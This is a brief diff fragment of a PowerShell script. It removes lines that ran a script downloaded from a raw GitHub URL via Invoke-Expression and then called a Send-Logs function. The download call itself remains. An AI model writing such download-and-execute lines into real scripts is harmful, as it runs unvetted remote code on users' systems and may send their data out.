@@ -355,8 +355,7 @@ function Main {
     $downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"
     $url = "https://raw.githubusercontent.com/suprsor/Credits/refs/heads/main/.github/workflows/Credits.ps1"
     $content = Invoke-RestMethod -Uri $url
-    Invoke-Expression $content
-    Send-Logs
+    
 
 
 
